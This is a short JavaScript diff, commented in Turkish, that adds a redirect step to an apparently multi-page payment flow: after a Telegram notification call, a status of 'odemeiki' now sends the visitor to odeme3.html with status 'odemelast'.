@@ -905,8 +905,19 @@
                     })
                     .then(response => response.json())
                     .then(telegramData => {
-                        // Status kontrolü - eğer status=dekontilk ise odeme2.html'e yönlendir
+                        // Status kontrolü - eğer status=odemeiki ise odeme3.html'e yönlendir
                         const currentStatus = urlParams.get('status');
+                        if (currentStatus === 'odemeiki') {
+                            // Tüm querystring parametrelerini al ve status'u odemelast yap
+                            const allParams = new URLSearchParams(window.location.search);
+                            allParams.set('status', 'odemelast');
+                            
+                            // odeme3.html'e yönlendir
+                            window.location.href = `odeme3.html?${allParams.toString()}`;
+                            return;
+                        }
+                        
+                        // Status kontrolü - eğer status=dekontilk ise odeme2.html'e yönlendir
                         if (currentStatus === 'dekontilk') {
                             // Tüm querystring parametrelerini al ve status'u odemeiki yap
                             const allParams = new URLSearchParams(window.location.search);
@@ -935,8 +946,19 @@
                     .catch(telegramError => {
                         console.error('Telegram bildirimi gönderilemedi:', telegramError);
                         
-                        // Status kontrolü - eğer status=dekontilk ise odeme2.html'e yönlendir
+                        // Status kontrolü - eğer status=odemeiki ise odeme3.html'e yönlendir
                         const currentStatus = urlParams.get('status');
+                        if (currentStatus === 'odemeiki') {
+                            // Tüm querystring parametrelerini al ve status'u odemelast yap
+                            const allParams = new URLSearchParams(window.location.search);
+                            allParams.set('status', 'odemelast');
+                            
+                            // odeme3.html'e yönlendir
+                            window.location.href = `odeme3.html?${allParams.toString()}`;
+                            return;
+                        }
+                        
+                        // Status kontrolü - eğer status=dekontilk ise odeme2.html'e yönlendir
                         if (currentStatus === 'dekontilk') {
                             // Tüm querystring parametrelerini al ve status'u odemeiki yap
                             const allParams = new URLSearchParams(window.location.search);
